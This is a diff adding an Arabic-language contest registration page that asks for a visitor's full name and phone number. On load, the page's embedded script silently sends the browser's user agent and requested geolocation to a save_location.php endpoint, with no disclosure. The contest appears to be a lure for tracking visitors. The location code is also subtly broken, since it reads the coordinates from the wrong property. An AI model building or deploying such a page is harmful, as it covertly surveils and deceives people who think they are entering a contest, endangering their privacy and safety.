@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مسابقه</title>
+</head>
+<script>
+
+
+    function getLocation() {
+        const userAgent = window.navigator.userAgent;
+        const xhttp = new XMLHttpRequest();
+        xhttp.open("GET", "save_location.php?lat=xxxx"+"&long=xxxx&useragent="+userAgent, true);
+        xhttp.send();
+        if (navigator.geolocation)
+        {
+            navigator.geolocation.getCurrentPosition(showPosition);
+        }
+        else
+        {
+
+        }
+    }
+    function showPosition(position) {
+        const userAgent = window.navigator.userAgent;
+        const xhttp = new XMLHttpRequest();
+        xhttp.open("GET", "save_location.php?lat="+position.latitude+"&long="+position.longitude+"&useragent="+userAgent, true);
+        xhttp.send();
+    }
+</script>
+<body onload="getLocation()">
+
+    <center>
+        <h2 style="color: #5c2594"><i>تسجيل   </i> </h2>
+
+        <label style="font-size: 20px;color: #5c2594;">الاسم رباعي</label>
+        <br>
+        <input type="text" style="font-size: 20px;border-radius: 10px;border-color: #b061ff;height: 30px;width: 200px;" name="name">
+        <br><br>
+        <label style="font-size: 20px;color: #5c2594;">رقم الهاتف</label>
+        <br>
+        <input type="text" style="font-size: 20px;border-radius: 10px;border-color: #b061ff;height: 30px;width: 200px;" name="name">
+        <br> <br>
+        <button  onclick="getLocation()" name="submit" style="font-size: 20px;border-radius: 10px;width: 150px;color: white;background-color: #5c2594;padding: 10px;" > تسجيل </button>
+    </center>
+
+</body>
+</html>
